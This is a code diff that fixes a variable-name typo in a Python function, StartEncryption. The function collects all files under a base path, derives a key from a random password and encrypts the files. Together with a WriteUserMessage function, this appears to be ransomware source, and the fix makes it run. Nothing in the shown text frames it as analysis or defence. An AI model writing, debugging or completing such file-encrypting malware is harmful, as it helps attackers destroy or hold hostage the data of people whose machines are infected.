@@ -72,7 +72,7 @@ def WriteUserMessage():
 def StartEncryption():
     files_to_encrypt = GetAllFiles(base_path)
     print("files to encrypt")
-    print(len(file_to_encrypt))
+    print(len(files_to_encrypt))
     password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
     key = SHA256.new(password.encode('utf-8')).digest()
     EncryptAllFiles(files_to_encrypt, key)
